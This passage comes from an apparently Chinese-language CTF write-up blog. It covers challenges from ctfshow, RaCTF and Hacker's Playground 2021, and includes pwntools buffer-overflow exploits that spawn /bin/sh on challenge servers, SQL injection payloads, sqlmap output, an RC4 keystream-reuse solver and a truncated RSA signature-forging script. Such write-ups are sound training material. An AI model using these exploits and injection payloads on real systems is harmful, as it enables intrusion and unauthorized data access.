            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                step2<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'failed'</span><span class="token punctuation">)</span>
            <span class="token comment"># time.sleep(100000)</span>
            <span class="token keyword">continue</span>


<span class="token triple-quoted-string string">"""
b'You choose the part_flag!\n'
b'ctfshow&#123;White_give_ timehahaha&#125;\n'
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>脚本写得像狗屎一样。</p>
<h3 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h3><p>binwalk分离出题目，解压出来的文本是一张二维码，内容为</p>
<pre class="line-numbers language-none"><code class="language-none">cfhwc19abika_etso&#123;h_u_e_ui1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815133721249.png" alt></p>
<p>栅栏密码=&gt;</p>
<pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;ch1_9ua_bei_kuai_1e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="RaCTF"><a href="#RaCTF" class="headerlink" title="RaCTF"></a>RaCTF</h1><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h3><p>签到</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">ractf&#123;so_here_we_are_again&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815200151479.png" alt></p>
<h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="I’m-a-Shouty-Man"><a href="#I’m-a-Shouty-Man" class="headerlink" title="I’m a Shouty Man"></a>I’m a Shouty Man</h3><pre class="line-numbers language-none"><code class="language-none">You have intercepted an shouty man&#39;s secret message. find the flag!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="Hacker’s-Playground-2021"><a href="#Hacker’s-Playground-2021" class="headerlink" title="Hacker’s Playground 2021"></a>Hacker’s Playground 2021</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816193908038.png" alt></p>
<h3 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h3><pre class="line-numbers language-none"><code class="language-none">Did you enjoy Hacker&#39;s Playground 2021?
To make a better event, please participate in the survey below.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>调查问卷</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SCTF&#123;7h4nk_yOu_533_y0u_4941n_1n_S5TF2O22!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210818002752794.png" alt></p>
<h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BOF-101"><a href="#BOF-101" class="headerlink" title="BOF 101"></a>BOF 101</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816194223883.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816194536967.png" alt></p>
<p>看看它的数据栈的结构</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816210215266.png" alt></p>
<p>直接写脚本。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'bof101.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x555555555229</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># SCTF&#123;n0w_U_R_B0F_3xpEr7&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>0xdeadbeef</code>覆盖的地址是8bytes，还要再加上4bytes才能溢出返回地址。</p>
<h3 id="BOF-102"><a href="#BOF-102" class="headerlink" title="BOF 102"></a>BOF 102</h3><p>刚开始没有看到它提供了下载链接，哎我的锅，</p>
<p><code>nc bof102.sstf.site 1337</code></p>
<p>直接给出了c源码，这也太明目张胆了，直接变白盒Pwn</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">bofme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name > "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s.\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you wanna build a snowman?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" > "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"!!!%s!!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'Welcome to BOF 102!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">bofme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是还是要看system函数的地址，我又打开了ida。。。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816222930056.png" alt></p>
<p>写利用脚本。这里没有设置专门的开<code>/bin/sh</code>的system函数，所以这里不仅要设置system函数的地址，还要设置system函数的参数，也就是<code>/bin/sh</code>，并且最终决定将这个参数设置在下图中圈1的位置，圈2的位置是溢出处。然后将system的参数设置为name变量的起始位置<code>0x0804a034</code>即可</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816225058216.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'bof102.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
sysargs <span class="token operator">=</span> <span class="token string">b'/bin/sh'</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080483E0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a034</span><span class="token punctuation">)</span>  <span class="token comment"># 32位程序的返回地址是4bytes。</span>


chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>sysargs<span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
cat flag
SCTF&#123;B0F_A774ck_w1Th_arg5_1n_x86&#125;
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SQLi-101"><a href="#SQLi-101" class="headerlink" title="SQLi 101"></a>SQLi 101</h3><p>简单的sql注入，还带提示，直接payload<code>admin&#39; || &#39;1&#39;=&#39;1#</code>拿下</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816234526222.png" alt></p>
<h3 id="SQLi-102"><a href="#SQLi-102" class="headerlink" title="SQLi 102"></a>SQLi 102</h3><p>联合查询注入，懒得手测，直接sqlmap</p>
<pre class="line-numbers language-none"><code class="language-none">$ sqlmap -u &#39;http:&#x2F;&#x2F;sqli102.sstf.site&#x2F;step3.php?searchkey&#x3D;1&#39; --batch -D sqli102 -T findme -columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  &#123;1.5.5#stable&#125;
|_ -| . [,]     | .&#39;| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http:&#x2F;&#x2F;sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:35:02 &#x2F;2021-08-17&#x2F;

[00:35:02] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[00:35:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: searchkey (GET)
    Type: time-based blind
    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchkey&#x3D;1&#39; AND (SELECT 6169 FROM (SELECT(SLEEP(5)))mjsW) AND &#39;TYuL&#39;&#x3D;&#39;TYuL

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: searchkey&#x3D;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x7178717171,0x614d795469735164567877744b556652536d5a5651444451616c427864456f62704474446b455464,0x71766b7671),NULL,NULL,NULL,NULL,NULL-- -
---
[00:35:02] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.3, Nginx 1.21.1
back-end DBMS: MySQL &gt;&#x3D; 5.0.12
[00:35:02] [INFO] fetching columns for table &#39;findme&#39; in database &#39;sqli102&#39;
Database: sqli102
Table: findme
[4 columns]
+----------+------------+
| Column   | Type       |
+----------+------------+
| 1lls&#125;    | varchar(4) |
| SCTF&#123;    | int(10)    |
| b451c_SQ | varchar(4) |
| Li_5k    | varchar(4) |
+----------+------------+

[00:35:03] [INFO] fetched data logged to text files under &#39;&#x2F;home&#x2F;m4xlmum&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;sqli102.sstf.site&#39;

[*] ending @ 00:35:03 &#x2F;2021-08-17&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SCTF&#123;b451c_SQLi_5k1lls&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RC-four"><a href="#RC-four" class="headerlink" title="RC four"></a>RC four</h3><p>这个没怎么看过，直接看看他解释的，好像就是一个简单的和keystream的异或。所以先将明文与密文异或获得keysteam，再将keystream与flag的密文异或获得flag。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210817194600281.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>


c1 <span class="token operator">=</span> <span class="token number">0x634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8</span>
c2 <span class="token operator">=</span> <span class="token number">0x624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb</span>

m1 <span class="token operator">=</span> <span class="token string">b"RC4 is a Stream Cipher, which is very simple and fast."</span>
c1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
l <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>cc1<span class="token punctuation">,</span> cc2<span class="token punctuation">,</span> mm1<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>c1<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> c2<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> m1<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    keystream <span class="token operator">=</span> cc1 <span class="token operator">^</span> mm1
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>cc2 <span class="token operator">^</span> keystream<span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># SCTF&#123;B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="RSA-101"><a href="#RSA-101" class="headerlink" title="RSA 101"></a>RSA 101</h3><pre class="line-numbers language-none"><code class="language-none">Did you learn exponentiation in the middle school?

RSA doesn&#39;t ask for more than that.

The server is running at: nc rsa101.sstf.site 1104.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码如下所示，只涉及一个简单的解密</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getStrongPrime<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes
<span class="token keyword">from</span> os <span class="token keyword">import</span> system

p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
e <span class="token operator">=</span> <span class="token number">65537</span>
d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[RSA parameters]"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
	m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
	s <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
	<span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	s <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	v <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
	<span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>v<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nWelcome to command signer/executor."</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Menu : 1. Verify and run the signed command"</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       2. Generate a signed command"</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       3. Base64 encoder"</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       4. Exit"</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
	welcome<span class="token punctuation">(</span><span class="token punctuation">)</span>
	sel <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">" > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> sel <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>
		sgn <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Signed command: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
		sgn <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>sgn<span class="token punctuation">)</span>
		cmd <span class="token operator">=</span> verify<span class="token punctuation">(</span>sgn<span class="token punctuation">)</span>

		commands <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"ls -l"</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">,</span> <span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"cat flag"</span><span class="token punctuation">]</span>
		<span class="token keyword">if</span> cmd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> commands<span class="token punctuation">:</span>
			system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Possible commands: "</span><span class="token punctuation">,</span> commands<span class="token punctuation">)</span>

	<span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>
		cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Base64 encoded command to sign: "</span><span class="token punctuation">)</span>
		cmd <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
		<span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">b"cat flag"</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's forbidden."</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signed command:"</span><span class="token punctuation">,</span> b64encode<span class="token punctuation">(</span>sign<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"3"</span><span class="token punctuation">:</span>
		cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"String to encode: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64 encoded string:"</span><span class="token punctuation">,</span> b64encode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"4"</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye."</span><span class="token punctuation">)</span>
		exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid selection."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个原理就是将明文分解，利用mod运算的性质，直接获得m</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210818002342952.png" alt></p>
<p>其中<code>m = m1 * m2</code>，因为这里只需绕过黑名单<code>cat flag</code>即可，所以操作也不难。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">import</span> FactorDB
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token punctuation">,</span> b64encode


<span class="token keyword">def</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">b' > Base64 encoded command to sign: Signed command: '</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
                tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
                c <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> c
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>


chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'rsa101.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1104</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> <span class="token number">0</span>
e <span class="token operator">=</span> <span class="token number">0x10001</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>
